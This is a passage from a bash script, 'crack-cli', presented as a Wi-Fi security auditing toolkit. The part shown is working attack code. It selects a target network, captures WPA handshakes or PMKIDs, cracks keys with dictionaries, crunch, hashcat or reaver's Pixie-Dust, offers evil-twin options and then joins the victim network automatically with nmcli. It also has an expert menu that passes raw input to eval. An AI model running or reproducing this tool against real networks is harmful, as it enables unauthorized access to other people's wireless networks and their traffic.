  warn "This installs the full toolkit:"; printf '%s\n' "$pkgs" | paste -sd' ' -
  confirm "Proceed with apt install?" || return 1
  apt-get update -y
  local p
  while read -r p; do
    [[ -z "$p" ]] && continue
    info "Installing $p…"
    apt-get install -y "$p" || warn "Could not install $p (may be in a different repo / not packaged)."
  done <<< "$pkgs"
  ok "Done. Run 'Show tool availability' to review."
}

run_attack() {
  local bssid="${B_BSSID[$PICK]}" ch="${B_CH[$PICK]}" enc="${B_ENC[$PICK]}" essid="${B_ESSID[$PICK]}"
  head_ "Target: $essid ($bssid) — channel $ch, $enc"
  case "$enc" in
    OPEN) info "Open network — no key required."; maybe_connect "$essid" "" ;;
    WEP)  attack_wep "$bssid" "$ch" "$essid" ;;
    WPA3)
      err "This network is WPA3-SAE, which has no practical offline attack."
      ask_choice "How would you like to proceed?" "Try PMKID / evil-twin instead" "Pick a different network"
      case $REPLY_IDX in 1) info "Use the Capture (PMKID) or Evil-twin menu."; return 1 ;; 2) return 1 ;; esac ;;
    *) attack_wpa "$bssid" "$ch" "$essid" ;;
  esac
}

attack_wpa() {
  local bssid="$1" ch="$2" essid="$3"
  ask_choice "Attack method for $essid:" \
    "Auto — capture handshake, dictionary attack" \
    "Handshake + bruteforce (crunch)" \
    "Handshake → hashcat (GPU)" \
    "WPS Pixie-Dust (reaver)" \
    "PMKID (hcxdumptool)" \
    "Pick a different network"
  case $REPLY_IDX in
    1) ensure_handshake "$bssid" "$ch" "$essid" && crack_dict_on_cap "$bssid" "$essid" ;;
    2) ensure_handshake "$bssid" "$ch" "$essid" && crack_brute_on_cap "$bssid" "$essid" ;;
    3) ensure_handshake "$bssid" "$ch" "$essid" && { local h="$WORKDIR/${bssid//:/}.22000"; hcx_convert -o "$h" "$CAP" >/dev/null 2>&1 && { LAST_HASH="$h"; crack_hashcat "$h"; } || err "Install hcxtools to convert the handshake."; } ;;
    4) need_tool reaver && reaver -i "$MON" -b "$bssid" -c "$ch" -K 1 -N -vv ;;
    5) capture_pmkid ;;
    6) return 1 ;;
  esac
}

show_success() {
  local essid="$1" key="$2"
  printf '\n%s\n' "${GRN}${B}  KEY FOUND${R}"
  printf '  %-10s %s\n' "Network:" "$essid"
  [[ -n "$key" ]] && printf '  %-10s %s%s%s\n' "Password:" "$B" "$key" "$R"
  maybe_connect "$essid" "$key"
}

maybe_connect() {
  local essid="$1" key="$2" cmd
  [[ -n "$key" ]] && cmd="nmcli dev wifi connect '$essid' password '$key'" || cmd="nmcli dev wifi connect '$essid'"
  ask_choice "Connect to $essid now?" "Yes, connect with nmcli" "No, just show the command"
  if (( REPLY_IDX == 2 )); then say "  Run: ${DIM}${cmd}${R}"; return 0; fi
  have nmcli || { warn "nmcli not found. Run manually: $cmd"; return 0; }
  [[ -n "$MON" ]] && { airmon-ng stop "$MON" >/dev/null 2>&1; MON=""; }
  for c in "systemctl restart NetworkManager" "service NetworkManager restart" "service network-manager restart"; do
    $c >/dev/null 2>&1 && break
  done
  NM_STOPPED=0; sleep 3
  nmcli dev wifi rescan >/dev/null 2>&1; sleep 2
  local rc
  if [[ -n "$key" ]]; then nmcli dev wifi connect "$essid" password "$key"; rc=$?; else nmcli dev wifi connect "$essid"; rc=$?; fi
  (( rc == 0 )) && ok "Connected to $essid. You are on the network." || warn "Auto-connect failed. Run manually: $cmd"
}

guided_audit() {
  while true; do
    scan_and_pick || return
    if run_attack; then
      ask_choice "What next?" "Audit another network" "Back to main menu"
      (( REPLY_IDX == 1 )) || return
    fi
  done
}

menu_expert() {
  info "Runs a raw command. Variables available: \$MON=${MON:-none} \$IFACE=${IFACE:-none} \$WORKDIR"
  ask_str "Command" || return
  eval "$REPLY_STR"
}

main() {
  say "${B}${CYA}crack-cli${R} ${DIM}— complete command-line Wi-Fi security auditing toolkit${R}"
  authorize
  require_root
  WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/crack-cli.XXXXXX")"
  while true; do
    ask_choice "Main menu   ${DIM}(iface=${IFACE:-none} mon=${MON:-none})${R}" \
      "Guided WPA/WPA2 audit (scan → capture → crack → connect)" \
      "Recon & scanning" \
      "Capture (handshake / PMKID)" \
      "Crack a capture (aircrack-ng / hashcat / john / cowpatty)" \
      "WEP attacks" \
      "WPS attacks" \
      "Evil twin / rogue AP / WPA-Enterprise" \
      "Automated frameworks (wifite / airgeddon / fluxion / bettercap / kismet / mdk4)" \
      "Utilities (monitor mode, channel, MAC, dependencies)" \
      "Expert: run a raw command" \
      "Quit"
    case $REPLY_IDX in
      1) guided_audit ;;
      2) menu_recon ;;
      3) menu_capture ;;
      4) menu_crack ;;
      5) menu_wep ;;
      6) menu_wps ;;
      7) menu_eviltwin ;;
      8) menu_frameworks ;;
      9) menu_utils ;;
      10) menu_expert ;;
      11) break ;;
    esac
  done
}

main
